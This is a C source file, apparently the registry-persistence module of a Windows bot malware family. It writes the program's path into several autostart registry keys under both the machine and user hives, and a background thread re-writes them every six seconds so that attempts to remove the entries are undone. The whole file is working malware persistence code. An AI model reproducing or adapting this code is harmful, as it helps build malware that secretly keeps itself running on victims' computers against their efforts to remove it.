#include "../header/includes.h"
#include "../header/functions.h"
#include "../header/externs.h"


// globals
#ifndef NO_REGISTRY
int registry_delay=6000;
#endif

AUTOSTART autostart[]={
	{HKEY_LOCAL_MACHINE,(LPCTSTR)regkey1},
	{HKEY_LOCAL_MACHINE,(LPCTSTR)regkey2},
	{HKEY_LOCAL_MACHINE,(LPCTSTR)regkey3},
	{HKEY_LOCAL_MACHINE,(LPCTSTR)regkey4},
	{HKEY_CURRENT_USER,(LPCTSTR)regkey1},
	{HKEY_CURRENT_USER,(LPCTSTR)regkey2},
	{HKEY_CURRENT_USER,(LPCTSTR)regkey3},
	{HKEY_CURRENT_USER,(LPCTSTR)regkey4},
};

void AutoStartRegs(char *nfilename)
{
	HKEY key;

	for (int i=0; i < (sizeof(autostart) / sizeof(AUTOSTART)); i++) {
		fRegCreateKeyEx(autostart[i].hkey, autostart[i].subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		if (nfilename)
			fRegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)nfilename, strlen(nfilename));
		else
			fRegDeleteValue(key, valuename); 
		fRegCloseKey(key); 
	}
   
	return;
}

#ifndef NO_REGISTRY
DWORD WINAPI AutoRegistry(LPVOID param)
{
	char *nfilename = (char *)param;

	while (1) {
		AutoStartRegs(nfilename);
		Sleep(registry_delay);
	}
	return 0;
}
#endif






